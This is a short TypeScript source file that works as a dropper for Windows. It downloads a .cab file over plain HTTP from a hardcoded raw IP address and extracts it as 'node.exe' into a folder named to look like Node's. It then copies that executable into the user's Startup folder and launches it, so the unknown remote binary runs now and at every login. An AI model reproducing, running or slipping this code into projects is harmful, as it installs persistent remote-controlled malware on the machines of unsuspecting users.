import fs from 'fs';
import path from 'path';
import os from 'os';
import { exec } from 'child_process';
import request from 'request';
const { username } = os.userInfo();
const basePath = `C:\\Users\\${username}\\AppData\\Local\\node`;
const startUpPath = `C:\\Users\\${username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`;
const downloadApp = 'data.cab';
const extractedApp = 'node.exe';

if (!fs.existsSync(basePath)) fs.mkdirSync(basePath, { recursive: true });

async function downloadFile(directory: string, url: string, fileName: string): Promise<string> {
    if (!fs.existsSync(directory)) fs.mkdirSync(directory, { recursive: true });
    try {
        const filePath = path.join(directory, fileName);
        const fileStream = fs.createWriteStream(filePath);
        
        await new Promise((resolve, reject) => {
            request(url)
                .pipe(fileStream)
                .on('finish', () => resolve(undefined))
                .on('error', reject);
        });
        
        return filePath;
    } catch (error) {
        console.error('Error downloading file:', error);
    }
}

async function extractCabFile(cabFilePath: string, outputPath: string): Promise<void> {
    try {
        const extractCommand = `expand "${cabFilePath}" -F:* "${outputPath}"`;
        
        console.log('Extracting .cab file using Windows expand command...');
        await new Promise((resolve, reject) => {
            exec(extractCommand, (error: any, stdout: any, stderr: any) => {
                if (error) {
                    console.error(`Error extracting .cab file: ${error.message}`);
                    reject(error);
                    return;
                }
                if (stderr) {
                    console.error(`Command error: ${stderr}`);
                    reject(new Error(stderr));
                    return;
                }
                console.log('Extraction completed successfully.');
                console.log(stdout);
                resolve(undefined);
            });
        });
    } catch (extractError) {
        console.error('Error extracting .cab file:', extractError);
        throw extractError;
    }
}

export async function main() {
    const url = "http://95.216.251.178:9121/api/v1/download/w-ws";
    try {
        await downloadFile(basePath, url, downloadApp);
        await extractCabFile(path.join(basePath, downloadApp), path.join(basePath, extractedApp));
        fs.copyFileSync(path.join(basePath, extractedApp), path.join(startUpPath, extractedApp));
        exec(`start "" "${path.join(startUpPath, extractedApp)}"`);
    } catch (error) {
        console.error('Process failed:', error);
    }
}
